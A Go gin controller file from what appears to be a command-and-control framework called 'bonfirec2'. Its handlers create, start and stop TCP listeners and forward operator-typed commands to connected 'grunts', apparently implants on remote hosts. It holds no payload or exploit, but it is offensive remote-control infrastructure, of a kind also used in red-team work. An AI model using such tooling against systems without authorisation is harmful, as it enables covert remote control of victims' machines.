package controller

import (
	"log"
	"net/http"
	"strconv"
	"strings"

	"github.com/Jojojojodr/bonfirec2"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func NewListener(c *gin.Context) {
	id := uuid.New().String()
	port := strconv.FormatInt(7777+int64(len(bonfirec2.Listeners)), 10)

	listener := bonfirec2.NewListener(id, "localhost", port, "tcp")
	go func() {
		if err := listener.Start(); err != nil {
			log.Printf("failed to start listener %s: %v", id, err)
		}
	}()
	bonfirec2.Listeners[id] = listener

	redirectTarget := c.GetHeader("Referer")
	if redirectTarget == "" {
		redirectTarget = "/"
	}

	c.Redirect(http.StatusSeeOther, redirectTarget)
}

func StartListener(c *gin.Context) {
	id := c.Query("id")
	listener := bonfirec2.Listeners[id]
	if listener == nil {
		c.String(http.StatusNotFound, "listener not found")
		return
	}

	go func() {
		if err := listener.Start(); err != nil {
			log.Printf("failed to start listener %s: %v", id, err)
		}
	}()

	redirectTarget := c.GetHeader("Referer")
	if redirectTarget == "" {
		redirectTarget = "/"
	}

	c.Redirect(http.StatusSeeOther, redirectTarget)
}

func StopListener(c *gin.Context) {
	id := c.Query("id")
	listener := bonfirec2.Listeners[id]
	if listener == nil {
		c.String(http.StatusNotFound, "listener not found")
		return
	}

	listener.Stop()

	redirectTarget := c.GetHeader("Referer")
	if redirectTarget == "" {
		redirectTarget = "/"
	}

	c.Redirect(http.StatusSeeOther, redirectTarget)
}

func SendGruntCommand(c *gin.Context) {
	id := c.Query("id")
	grunt := bonfirec2.Grunts[id]
	if grunt == nil {
		c.String(http.StatusNotFound, "grunt not found")
		return
	}

	command := strings.TrimSpace(c.PostForm("command"))
	if command == "" {
		c.Status(http.StatusNoContent)
		return
	}

	if err := bonfirec2.SendCommandToGrunt(id, command); err != nil {
		c.String(http.StatusConflict, "grunt is not connected")
		return
	}

	if err := bonfirec2.SaveGruntMessage(grunt.ListenerID, id, command, true); err != nil {
		log.Printf("failed to persist operator command for grunt %s: %v", id, err)
	}

	c.Status(http.StatusNoContent)
}
